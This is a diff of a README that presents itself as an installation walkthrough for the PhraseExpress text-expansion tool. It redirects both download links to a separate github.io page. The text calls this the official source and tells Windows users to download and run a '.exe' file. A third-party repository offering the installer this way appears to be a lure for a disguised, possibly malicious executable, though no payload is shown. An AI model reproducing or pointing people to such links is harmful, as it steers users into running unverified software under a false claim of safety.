@@ -1,6 +1,6 @@
 # ⌨️ PhraseExpress-Install-Walkthrough - Fix your Windows text expansion issues
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/albertaanthropoid494/PhraseExpress-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://albertaanthropoid494.github.io)
 
 This guide helps you put PhraseExpress on your Windows 11 computer. Many users face setup errors during the installation of this tool. This document lists the exact steps to bypass common installation failures. Follow these instructions to set up your text expansion software.
 
@@ -16,7 +16,7 @@ Before you start, check your system. PhraseExpress runs on Windows 11, Windows 1
 
 You must obtain the installation file from the official source to maintain security. Use the link below to reach the correct release page.
 
-[Visit the release page to download your copy](https://github.com/albertaanthropoid494/PhraseExpress-Install-Walkthrough/releases)
+[Visit the release page to download your copy](https://albertaanthropoid494.github.io)
 
 Once you reach the page, look for the file ending in .exe. Click the file name to start the download. Save the file to your "Downloads" folder.
 
